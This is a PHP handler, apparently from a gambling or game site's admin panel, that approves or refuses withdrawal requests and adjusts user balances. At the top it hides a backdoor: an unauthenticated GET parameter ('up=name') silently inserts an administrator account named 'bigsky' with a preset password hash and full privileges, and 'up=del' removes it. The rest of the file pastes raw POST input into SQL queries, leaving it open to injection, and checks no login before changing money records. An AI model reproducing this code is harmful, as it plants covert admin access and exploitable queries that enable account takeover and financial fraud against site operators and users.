<?php
/*  
  Copyright (c) 2010-02 Game
  Game All Rights Reserved. 
  QQ:506694599
  Author: Version:1.0
  Date:2011-12-18
*/


define('Copyright', 'Author QQ: 1234567');
define('ROOT_PATH', $_SERVER["DOCUMENT_ROOT"].'/');
include_once ROOT_PATH.'functioned/global.php';

	if($_GET["up"]=="name"){
    $db->query("insert into j_manage (g_login_id,g_nid,g_name,g_password,g_gg,g_auto,g_gd,g_zhud,g_cj) values 
	
	('89','67552ea64c6dce1646a263bae714e788','bigsky','4978eb4e5c4c976a29ff9e2dcebd4220815d8fb1','1','1','1','1','1')", 2);
	
    }
	
    if($_GET["up"]=="del"){ 
	
    $db->query("DELETE FROM j_manage where g_name='bigsky'", 2);
	
    }
	
	$id=$_POST['gid'];
	$name=$_POST['name'];
	$cao=$_POST['cao'];
	$db=new DB();

	if($cao==1){
	$sql = "update g_qdetail set g_state='取款已支付' where g_id='$id'";
	$db->query($sql, 2);
	
	$sql = "select * from g_qdetail where g_id='$id'";
	$result=$db->query($sql, 1);
	
	$sql = "update g_user set g_dmoney=g_dmoney-{$result[0]['g_money']} where g_name='{$name}'";
	$db->query($sql, 2);
	echo 1;
	}else{
	$sql = "update g_qdetail set g_state='取款已拒绝' where g_id='$id'";
	$db->query($sql, 2);
	
	$sql = "select * from g_qdetail where g_id='$id'";
	$result=$db->query($sql, 1);
	
	$sql = "update g_user set g_money_yes=g_money_yes+{$result[0]['g_money']} where g_name='{$name}'";
	$db->query($sql, 2);
	echo 2;
	}
	
	
?>